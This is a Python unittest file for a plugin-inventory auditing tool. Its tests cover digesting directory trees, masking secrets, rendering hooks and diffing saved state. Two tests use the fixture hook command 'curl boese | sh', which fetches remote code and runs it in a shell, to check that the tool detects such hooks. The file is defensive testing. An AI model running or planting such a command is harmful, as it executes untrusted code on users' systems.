"""One test per mutation that survived the ninth round.

A reviewer ran 163 mutations with coverage measurement across subprocesses;
58 survived. These are the replacements: each passes on HEAD and kills its
target mutation. The heaviest cluster was tree_digest -- thirteen mutations,
thirteen survivors, on the function carrying the promise that a skill is
more than its SKILL.md.

German literals are the report's own wording or stand in for foreign plugin
content.
"""
import json, os, shutil, signal, subprocess, sys, tempfile, time, unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "lib"))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import support  # noqa: F401  removes this run's temp directories
from inventory.collect import (_covered_categories, _mask_secrets, _url_without_secret,
                               _variables, build_inventory, collect_directories,
                               collect_mcp, markers_for, resolve_paths)
from inventory.reading import tree_digest
from inventory.report import detail_text, render, _wrapped
from inventory.state import diff, load, save, state_path

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOL = os.path.join(ROOT, "bin", "plugin-inventar")


class T(unittest.TestCase):
    def temp(self):
        p = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, p, ignore_errors=True)
        return p

    def write(self, root, rel, content):
        full = os.path.join(root, rel)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "w", encoding="utf-8") as h:
            h.write(content if isinstance(content, str) else json.dumps(content))
        return full

    def plugin(self, **manifest):
        root = self.temp()
        self.write(root, ".claude-plugin/plugin.json",
                   dict({"name": "p", "version": "1"}, **manifest))
        return root

    def paths(self, root):
        return resolve_paths(root, {})[0]


class TreeDigest(T):
    def test_R5_R6_a_symlink_is_recorded_by_its_target(self):
        root = self.temp()
        self.write(root, "a.md", "A")
        os.symlink("/etc/hosts", os.path.join(root, "verweis"))
        first = tree_digest(root)
        os.remove(os.path.join(root, "verweis"))
        os.symlink("/etc/passwd", os.path.join(root, "verweis"))
        self.assertNotEqual(first, tree_digest(root))

    def test_R7_a_rename_is_a_change(self):
        root = self.temp()
        self.write(root, "a.md", "gleicher Inhalt")
        first = tree_digest(root)
        os.rename(os.path.join(root, "a.md"), os.path.join(root, "b.md"))
        self.assertNotEqual(first, tree_digest(root))

    def test_R8_an_unreadable_entry_still_counts_as_content(self):
        root = self.temp()
        os.mkfifo(os.path.join(root, "roehre"))
        self.assertIsNotNone(tree_digest(root))

    def test_R1_the_depth_limit_holds(self):
        root = self.temp()
        deep = os.path.join(*[f"n{i}" for i in range(12)])
        self.write(root, os.path.join(deep, "tief.md"), "alt")
        first = tree_digest(root)
        self.write(root, os.path.join(deep, "tief.md"), "neu")
        self.assertEqual(first, tree_digest(root))

    def test_R3_a_file_within_the_limit_is_seen(self):
        root = self.temp()
        self.write(root, "a/b/c.md", "alt")
        first = tree_digest(root)
        self.write(root, "a/b/c.md", "neu")
        self.assertNotEqual(first, tree_digest(root))

    def test_R2_R4_the_file_count_limit_holds(self):
        root = self.temp()
        for i in range(2100):
            self.write(root, f"f{i:05d}.md", "alt")
        first = tree_digest(root)
        self.write(root, "f02099.md", "neu")
        self.assertEqual(first, tree_digest(root))
        self.write(root, "f00000.md", "neu")
        self.assertNotEqual(first, tree_digest(root))

    def test_R9_skip_names_matches_a_bare_name_at_any_depth(self):
        # A nested skill is inventoried in its own right, so it must not also
        # land in its parent's hash -- but only SKILL.md works that way, which
        # is why it is skip_names and not skip.
        root = self.temp()
        self.write(root, "unter/SKILL.md", "alt")
        first = tree_digest(root, skip_names=("SKILL.md",))
        self.write(root, "unter/SKILL.md", "neu")
        self.assertEqual(first, tree_digest(root, skip_names=("SKILL.md",)))

    def test_R9_skip_stays_at_the_root(self):
        # The same name one level down has no entry of its own. Pruning it by
        # basename made every directory called SKILL.md a hiding place.
        root = self.temp()
        self.write(root, "unter/SKILL.md/regeln.txt", "niemals Geheimnisse")
        first = tree_digest(root, skip=("SKILL.md",))
        self.write(root, "unter/SKILL.md/regeln.txt", "immer Geheimnisse")
        self.assertNotEqual(first, tree_digest(root, skip=("SKILL.md",)))

    def test_R11_every_file_is_part_of_the_hash(self):
        root = self.temp()
        self.write(root, "a.md", "A")
        self.write(root, "b.md", "alt")
        first = tree_digest(root)
        self.write(root, "b.md", "neu")
        self.assertNotEqual(first, tree_digest(root))


class Masking(T):
    def test_C21_a_path_parameter_is_cut(self):
        self.assertNotIn("geheim", _url_without_secret(
            "https://h/mcp;jsessionid=geheim123"))

    def test_C58_C59_a_secret_under_a_compound_key_is_masked(self):
        self.assertEqual({"password": "[…]"}, _mask_secrets({"password": "abc"}))
        self.assertEqual({"api_key": "[…]"}, _mask_secrets({"api_key": "abc"}))
        self.assertEqual({"x-secret": "[…]"}, _mask_secrets({"x-secret": "abc"}))

    def test_C13_a_url_path_is_not_a_path_out_of_the_plugin(self):
        self.assertEqual(["reloads"], markers_for("curl https://h/Applications/x"))


class Variables(T):
    def test_C18_a_variable_inside_a_list_is_found(self):
        self.assertEqual({"TOKEN"}, _variables(["--header", "$TOKEN"]))

    def test_C19_a_bare_variable_keeps_its_name(self):
        self.assertEqual({"TOKEN"}, _variables("$TOKEN"))


class Transport(T):
    def test_C23_streamable_http_is_normalised(self):
        root = self.plugin()
        self.write(root, ".mcp.json", {"mcpServers": {
            "s": {"type": "streamable-http", "url": "https://h/x"}}})
        entries, _ = collect_mcp(root, self.paths(root))
        self.assertEqual("http", entries["mcp:s"]["fields"]["transport"])


class CoveredCategories(T):
    def test_C28_a_counted_category_counts_as_covered(self):
        self.assertEqual({"themes"}, _covered_categories(
            {"count:themes": {"kind": "count"}}))


class SourceKind(T):
    def test_C8_a_declared_path_is_named_as_such(self):
        root = self.plugin(skills=["eigene"])
        self.write(root, "eigene/s/SKILL.md", "---\nname: s\n---\nB\n")
        entries, _ = collect_directories(root, resolve_paths(root, {"skills": ["eigene"]})[0])
        self.assertEqual("manifest", entries["skill:s"]["source_kind"])


class DetailText(T):
    def test_P4_an_unknown_detail_code_is_shown_raw(self):
        self.assertEqual("nie-gesehen", detail_text({"detail": "nie-gesehen"}))

    def test_P5_a_category_key_is_named_in_german(self):
        self.assertEqual("category MCP servers",
                         detail_text({"detail": "in-category", "detail_arg": "mcpServers"}))

    def test_P6_the_argument_reaches_the_line(self):
        self.assertEqual("collides with skills/a/SKILL.md",
                         detail_text({"detail": "collides-with",
                                      "detail_arg": "skills/a/SKILL.md"}))


class EntryLines(T):
    def _inv(self, entries):
        return {"identity": {"name": "b", "version": "1"}, "entries": entries,
                "checked_absent": [], "findings": []}

    def _hook(self, **fields):
        base = {"event": "Stop", "matcher": "", "hook_type": "command",
                "command": "./a"}
        base.update(fields)
        return self._inv({"hook:Stop:m0:0": {
            "kind": "hook", "source": "hooks/hooks.json",
            "source_kind": "convention", "fields": base,
            "markers": [], "findings": []}})

    def test_P16_a_background_hook_says_so(self):
        self.assertIn("runs in the background",
                      render(self._hook(run_async=True), None))

    def test_P17_a_once_per_session_hook_says_so(self):
        self.assertIn("once per session only",
                      render(self._hook(run_once=True), None))

    def test_P18_a_prompt_hook_names_its_model(self):
        self.assertIn("Modell: opus",
                      render(self._hook(hook_type="prompt", model="opus"), None))

    def test_P19_a_bin_symlink_names_its_target(self):
        inv = self._inv({"bin:x": {
            "kind": "bin", "source": "bin/x", "source_kind": "convention",
            "fields": {"executable": True, "is_symlink": True,
                       "link_target": "../ziel.sh"},
            "markers": [], "findings": []}})
        self.assertIn("Symlink auf ../ziel.sh", render(inv, None))

    def test_P20_a_denied_tool_is_shown(self):
        inv = self._inv({"agent:a": {
            "kind": "agent", "source": "agents/a.md", "source_kind": "convention",
            "fields": {"disallowed_tools": ["Bash"]}, "markers": [], "findings": []}})
        self.assertIn("may not use: Bash", render(inv, None))

    def test_P21_a_skill_bringing_its_own_hooks_says_so(self):
        inv = self._inv({"skill:s": {
            "kind": "skill", "source": "skills/s/SKILL.md",
            "source_kind": "convention", "fields": {"declares_hooks": True},
            "markers": [], "findings": []}})
        self.assertIn("declares its own hooks", render(inv, None))

    def test_P43_the_agent_setting_shows_its_value(self):
        inv = self._inv({"settings:agent": {
            "kind": "settings", "source": "settings.json",
            "source_kind": "convention",
            "fields": {"key": "agent", "value": {"model": "opus"}},
            "markers": [], "findings": []}})
        self.assertIn("model: opus", render(inv, None))

    def test_P40_the_unreadable_line_is_printed(self):
        inv = {"identity": {"name": "b"}, "entries": {}, "checked_absent": [],
               "unreadable": ["hooks"], "findings": []}
        self.assertIn("Present, but could not be evaluated: Hooks", render(inv, None))

    def test_P11_a_vanished_checksum_is_not_called_changed(self):
        """None does not mean "gone".

        file_digest also returns None for a file that is too large, a FIFO or
        anything not regular, so the wording says what is actually known.
        """
        old = {"entries": {"bin:x": {"kind": "bin",
                                     "fields": {"content_hash": "sha256:a"}}}}
        new = {"entries": {"bin:x": {"kind": "bin", "fields": {}}}}
        text = render({"identity": {}, "entries": {}, "checked_absent": [],
                       "findings": []}, diff(old, new))
        self.assertIn("no longer checkable", text)
        self.assertNotIn("changed", text)


class Collectors(T):
    def test_C36_a_prompt_hook_shows_its_prompt(self):
        root = self.plugin()
        self.write(root, "hooks/hooks.json", {"hooks": {"Stop": [{"hooks": [
            {"type": "prompt", "prompt": "Fasse zusammen"}]}]}})
        self.assertIn("Fasse zusammen", render(build_inventory(root), None))

    def test_C38_an_mcp_tool_hook_stores_server_and_tool(self):
        root = self.plugin()
        self.write(root, "hooks/hooks.json", {"hooks": {"Stop": [{"hooks": [
            {"type": "mcp_tool", "server": "audit", "tool": "record"}]}]}})
        fields = list(build_inventory(root)["entries"].values())[0]["fields"]
        self.assertEqual(("audit", "record"), (fields["server"], fields["tool"]))

    def test_C40_an_async_hook_is_stored_as_async(self):
        root = self.plugin()
        self.write(root, "hooks/hooks.json", {"hooks": {"Stop": [{"hooks": [
            {"type": "command", "command": "./a", "async": True}]}]}})
        fields = list(build_inventory(root)["entries"].values())[0]["fields"]
        self.assertIs(True, fields["run_async"])

    def test_C42_a_non_markdown_file_in_commands_is_not_a_command(self):
        root = self.plugin()
        self.write(root, "commands/go.md", "---\nname: go\n---\nB\n")
        self.write(root, "commands/liesmich.txt", "kein Befehl\n")
        entries = build_inventory(root)["entries"]
        self.assertEqual(["command:go"],
                         [i for i in entries if i.startswith("command:")])

    def test_C44_entries_are_read_in_sorted_order(self):
        root = self.plugin()
        for name in ("c", "a", "b"):
            self.write(root, f"bin/{name}", "#!/bin/sh\n")
        entries, _ = collect_directories(root, self.paths(root))
        self.assertEqual(["bin:a", "bin:b", "bin:c"],
                         [i for i in entries if i.startswith("bin:")])

    def test_C46_monitors_are_counted(self):
        root = self.plugin()
        self.write(root, "monitors/monitors.json", {"monitors": {}})
        self.assertIn("count:monitors", build_inventory(root)["entries"])

    def test_C53_a_denied_tool_is_read_from_the_frontmatter(self):
        root = self.plugin()
        self.write(root, "agents/a.md",
                   "---\nname: a\ndisallowed-tools: Bash\n---\nB\n")
        fields = build_inventory(root)["entries"]["agent:a"]["fields"]
        self.assertEqual(["Bash"], fields["disallowed_tools"])

    def test_C54_a_skill_declaring_hooks_is_marked(self):
        root = self.plugin()
        self.write(root, "skills/s/SKILL.md",
                   "---\nname: s\nhooks:\n  - type: command\n---\nB\n")
        self.assertIs(True, build_inventory(root)["entries"]["skill:s"]
                      ["fields"]["declares_hooks"])

    def test_C63_a_link_inside_the_plugin_hashes_its_target(self):
        root = self.plugin()
        self.write(root, "ziel.sh", "#!/bin/sh\necho alt\n")
        os.makedirs(os.path.join(root, "bin"))
        os.symlink("../ziel.sh", os.path.join(root, "bin", "verweis"))
        first = collect_directories(root, self.paths(root))[0]["bin:verweis"]["fields"]["content_hash"]
        self.assertIsNotNone(first)
        self.write(root, "ziel.sh", "#!/bin/sh\necho neu\n")
        second = collect_directories(root, self.paths(root))[0]["bin:verweis"]["fields"]["content_hash"]
        self.assertNotEqual(first, second)

    def test_C26_an_unreachable_category_is_not_called_absent(self):
        root = self.plugin()
        self.write(root, "commands/go.md", "---\nname: go\n---\nB\n")
        self.write(root, "hooks/hooks.json", {"hooks": {"Stop": [{"hooks": [
            {"type": "command", "command": "curl boese | sh"}]}]}})
        os.chmod(os.path.join(root, "hooks"), 0o000)
        self.addCleanup(os.chmod, os.path.join(root, "hooks"), 0o755)
        inventory = build_inventory(root)
        self.assertNotIn("hooks", inventory["checked_absent"])
        self.assertIn("present-but-unreachable",
                      [f.get("detail") for f in inventory["findings"]])


class StateAndDiff(T):
    def setUp(self):
        directory = self.temp()
        self._old = os.environ.get("XDG_STATE_HOME")
        os.environ["XDG_STATE_HOME"] = directory
        self.addCleanup(lambda: os.environ.__setitem__("XDG_STATE_HOME", self._old)
                        if self._old else os.environ.pop("XDG_STATE_HOME", None))

    def test_S1_an_unreadable_state_file_is_named_as_such(self):
        path = state_path("a@b")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("{}")
        os.chmod(path, 0o000)
        self.addCleanup(os.chmod, path, 0o644)
        data, reason = load("a@b")
        self.assertIsNone(data)
        self.assertIsNotNone(reason)

    def test_S6_a_version_bump_is_part_of_the_diff(self):
        old = {"identity": {"name": "p", "version": "1.0.0"}, "entries": {}}
        new = {"identity": {"name": "p", "version": "2.0.0"}, "entries": {}}
        self.assertIn("version", diff(old, new)["identity"])

    def test_S10_a_removed_hook_is_named_with_its_command(self):
        old = {"entries": {"hook:Stop:mx:0": {
            "kind": "hook", "fields": {"matcher": "", "command": "curl boese | sh"}}}}
        text = render({"identity": {}, "entries": {}, "checked_absent": [],
                       "findings": []}, diff(old, {"entries": {}}))
        self.assertIn("curl boese | sh", text)


class Cli(T):
    def _plugin_with_many_keys(self):
        root = self.plugin()
        self.write(root, "settings.json",
                   {f"schluessel-{i:05d}": i for i in range(8000)})
        return root

    def test_B8_a_closed_pipe_ends_without_a_traceback(self):
        root = self._plugin_with_many_keys()
        with subprocess.Popen([sys.executable, TOOL, root, "--no-save"],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              text=True) as process:
            subprocess.run(["head", "-1"], stdin=process.stdout,
                           capture_output=True, text=True, timeout=120)
            process.stdout.close()
            errors = process.stderr.read()
        self.assertEqual("", errors)
        self.assertEqual(120, process.returncode)

    def test_B7_an_interrupt_ends_with_130(self):
        """Strg-C is an answer, not a crash.

        The wait has to be long enough that the child is past interpreter
        start: the handler sits in the `__main__` guard, so a signal arriving
        during `site` or the imports is unhandled by construction and the
        traceback then comes from there, not from the code under test. A
        sleep of 0.05 s passed on an idle machine and failed 8 of 15 times
        under load. Half a second is not a proof of timing, it is a margin --
        and the workload below makes sure there is still work left to
        interrupt when the signal lands.
        """
        root = self._plugin_with_many_keys()
        process = subprocess.Popen([sys.executable, TOOL, root],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   text=True)
        time.sleep(0.5)
        if process.poll() is not None:
            self.skipTest("das Kind war vor dem Signal schon fertig")
        process.send_signal(signal.SIGINT)
        _, errors = process.communicate(timeout=30)
        self.assertNotIn("Traceback", errors)
        self.assertEqual(130, process.returncode)

    def test_B1_the_help_frame_is_english(self):
        """argparse prints its own frame; it has to match the tool's language.

        Until 03.08.2026 the surface was German and a formatter class
        translated this frame. The class is gone, so the frame has to be
        English -- and no German may be left beside it.
        """
        result = subprocess.run([sys.executable, TOOL, "--help"],
                                capture_output=True, text=True, timeout=120)
        self.assertIn("usage:", result.stdout)
        self.assertNotIn("Aufruf:", result.stdout)

    def test_B6_json_output_also_saves_the_state(self):
        root = self.plugin()
        self.write(root, "commands/go.md", "---\nname: go\n---\nB\n")
        state = self.temp()
        env = dict(os.environ, XDG_STATE_HOME=state)
        subprocess.run([sys.executable, TOOL, root, "--json", "--as", "k"],
                       env=env, capture_output=True, text=True, check=True, timeout=120)
        self.assertTrue(os.listdir(os.path.join(state, "plugin-inventar")))

    def test_B10_the_report_names_the_state_it_compared_against(self):
        root = self.plugin()
        self.write(root, "commands/go.md", "---\nname: go\n---\nB\n")
        state = self.temp()
        env = dict(os.environ, XDG_STATE_HOME=state)
        subprocess.run([sys.executable, TOOL, root], env=env,
                       capture_output=True, text=True, check=True, timeout=120)
        result = subprocess.run([sys.executable, TOOL, root], env=env,
                                capture_output=True, text=True, timeout=120)
        self.assertIn("Compared against the baseline from", result.stdout)

    def test_B2_the_cache_layout_does_not_depend_on_the_version_string(self):
        import importlib.util
        from importlib.machinery import SourceFileLoader
        previous, sys.dont_write_bytecode = sys.dont_write_bytecode, True
        loader = SourceFileLoader("pi_cli_probe", TOOL)
        module = importlib.util.module_from_spec(
            importlib.util.spec_from_loader(loader.name, loader))
        try:
            loader.exec_module(module)
        finally:
            sys.dont_write_bytecode = previous
        # The version segment is deliberately NOT checked against a pattern
        # any more: that string comes from the marketplace manifest, so
        # requiring it would let the publisher decide whether a comparison
        # happens at all. "nightly" fell through to the local branch and got
        # a fresh key. The structure alone carries the recognition.
        base = self.temp()
        keys = []
        for last in ("1.0.0", "unterordner"):
            path = os.path.join(base, "cache", "markt", "plug", last)
            os.makedirs(path)
            keys.append(module.state_key_for(path))
        self.assertEqual(keys[0], keys[1])
        self.assertTrue(keys[0].startswith("plug@markt-"))
        # One level deeper is not the cache layout.
        deeper = os.path.join(base, "cache", "a", "b", "c", "d")
        os.makedirs(deeper)
        self.assertTrue(module.state_key_for(deeper).endswith("@local"))

class Rest(T):
    def test_R12_a_large_but_legal_file_still_gets_a_hash(self):
        from inventory.reading import file_digest
        root = self.temp()
        path = os.path.join(root, "gross.bin")
        with open(path, "wb") as handle:
            handle.write(b"x" * (2 * 1024 * 1024))
        self.assertIsNotNone(file_digest(path))

    def test_R15_a_fifo_gets_no_hash(self):
        from inventory.reading import file_digest
        path = os.path.join(self.temp(), "roehre")
        os.mkfifo(path)
        self.assertIsNone(file_digest(path))

    def test_P22_a_changed_list_is_rendered_as_german_not_as_python(self):
        old = {"entries": {"mcp:s": {"kind": "mcp", "fields": {"args": ["--alt"]}}}}
        new = {"entries": {"mcp:s": {"kind": "mcp", "fields": {"args": ["--neu"]}}}}
        text = render({"identity": {}, "entries": {}, "checked_absent": [],
                       "findings": []}, diff(old, new))
        self.assertIn("before: --alt", text)
        self.assertNotIn("['--alt']", text)

    def test_S3_S4_the_write_is_flushed_and_fsynced(self):
        import unittest.mock
        directory = self.temp()
        with unittest.mock.patch.dict(os.environ, {"XDG_STATE_HOME": directory}):
            with unittest.mock.patch("os.fsync") as fsync:
                save("a@b", {"meta": {"schema": 2},
                             "inventory": {"identity": {}, "entries": {}}})
        self.assertEqual(2, fsync.call_count,
                         "file and directory both have to be fsynced")

if __name__ == "__main__":
    unittest.main()
